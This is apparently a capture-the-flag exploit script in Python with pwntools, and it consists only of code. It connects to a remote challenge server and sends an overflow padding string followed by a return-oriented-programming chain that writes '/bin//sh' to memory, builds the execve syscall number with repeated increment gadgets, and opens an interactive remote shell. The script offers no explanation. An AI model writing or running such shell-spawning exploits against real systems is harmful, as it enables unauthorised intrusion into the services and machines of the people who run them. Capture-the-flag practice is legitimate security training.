from pwn import *
from struct import pack

r = remote('hack.bckdr.in', 15102)
# Padding goes here
p = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ'

p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0060) # @ .data
p += pack('<Q', 0x000000000046b9f8) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x00000000004680c1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0068) # @ .data + 8
p += pack('<Q', 0x000000000041c35f) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004680c1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004016c3) # pop rdi ; ret
p += pack('<Q', 0x00000000006c0060) # @ .data
p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0068) # @ .data + 8
p += pack('<Q', 0x00000000004377d5) # pop rdx ; ret
p += pack('<Q', 0x00000000006c0068) # @ .data + 8
p += pack('<Q', 0x000000000041c35f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045afa0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045bac5) # syscall ; ret

r.sendline(p)
r.interactive()